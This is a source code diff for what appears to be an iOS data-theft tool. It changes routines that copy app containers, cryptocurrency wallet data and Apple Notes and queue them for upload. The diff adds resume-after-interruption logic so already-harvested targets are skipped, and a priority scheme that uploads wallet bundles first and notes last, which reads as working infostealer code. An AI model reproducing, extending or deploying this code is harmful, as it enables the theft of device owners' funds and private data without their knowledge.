@@ -15,6 +15,7 @@
                                 bundleID:(NSString *)bid
                                    bytes:(NSNumber *)bytes;
 - (void)_uploadRunLog;
+- (OWUploadPriority)_priorityForName:(NSString *)name;
 @end
 
 @implementation OWRoute {
@@ -83,15 +84,21 @@
                 return;
             }
             OWLog(@"完成标记但仍有待上传数据，改为续跑");
-            [state beginNewRun];
+            [state beginResume];
         } else {
             OWLog(@"距上次完成已超过 24h，开始新一轮采集");
             [state beginNewRun];
         }
     } else {
-        // 上次中断/未完成：清掉上一轮结果后从头重跑，避免旧 payloads 误判完成
-        OWLog(@"上次未完成/中断，清理本轮状态后重跑");
-        [state beginNewRun];
+        // 上次中断/未完成：有目标级断点就续跑（不重复拷已采目标），没有才从头来
+        if ([state targetsDoneCount] > 0) {
+            OWLog(@"上次中断，检测到 %lu 个已完成目标，断点续跑",
+                  (unsigned long)[state targetsDoneCount]);
+            [state beginResume];
+        } else {
+            OWLog(@"上次未完成/中断且无目标断点，清理本轮状态后重跑");
+            [state beginNewRun];
+        }
     }
 
     OWUploader *up = [OWUploader new];
@@ -210,7 +217,8 @@
 
     if (!isDir) {
         // whole_container 已经是 zip（OWContainerPass 打包时已带 _manifest.json）
-        [up enqueueFile:p kind:OWUploadKindContainer error:nil];
+        [up enqueueFile:p kind:OWUploadKindContainer
+               priority:[self _priorityForName:name] error:nil];
         OWLog(@"上传: 整容器包 %@", p.lastPathComponent);
         return;
     }
@@ -230,7 +238,8 @@
                              totalCap:150ULL * 1024 * 1024
                                 error:&e];
     if (ok) {
-        BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer error:nil];
+        BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer
+                          priority:[self _priorityForName:name] error:nil];
         OWLog(@"上传: 钱包包 %@ -> %@", name, enq ? tmp.lastPathComponent : @"入队失败");
         [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
         return;
@@ -245,10 +254,19 @@
         NSString *full = [p stringByAppendingPathComponent:rel];
         BOOL d = NO;
         if (![[NSFileManager defaultManager] fileExistsAtPath:full isDirectory:&d] || d) continue;
-        [up enqueueFile:full kind:OWUploadKindContainer error:nil];
+        [up enqueueFile:full kind:OWUploadKindContainer
+               priority:[self _priorityForName:name] error:nil];
         n++;
     }
     OWLog(@"上传: 容器目录 %@ → %lu 个文件", name, (unsigned long)n);
+}
+
+/// 上传优先级：钱包 = P1（同优先级按体积小→大）；备忘录 = P3 永远最后
+- (OWUploadPriority)_priorityForName:(NSString *)name {
+    if ([name isEqualToString:@"Notes"] || [name isEqualToString:@"AppleNotes"]) {
+        return OWUploadPriorityNotes;
+    }
+    return OWUploadPriorityContainer;
 }
 
 - (NSDictionary *)_walletManifestForName:(NSString *)name
